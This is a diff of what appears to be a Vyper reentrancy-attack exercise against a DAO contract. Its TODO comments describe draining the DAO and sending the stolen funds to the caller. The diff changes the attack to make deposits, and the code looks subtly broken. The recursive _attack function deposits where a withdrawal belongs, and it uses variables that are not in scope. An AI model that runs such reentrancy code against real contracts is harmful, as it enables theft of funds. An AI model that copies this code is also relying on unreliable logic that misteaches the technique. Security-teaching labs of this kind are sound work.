@@ -16,7 +16,7 @@ def _attack() -> bool:
     assert self.dao_address != ZERO_ADDRESS
     
     if self.dao_address.userBalances[self.owner_address] > 0:
-        dao.withdraw()
+        DAO(dao_address).deposit(value = deposit_amount)
         
 
     return True
@@ -32,7 +32,7 @@ def attack(dao_address:address):
         deposit_amount = dao_address.balance
     
     # TODO: make the deposit into the DAO   
-    dao.deposit()
+    DAO(dao_address).deposit(value = deposit_amount)
     # TODO: Start the reentrancy attack
     self._attack()
     # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
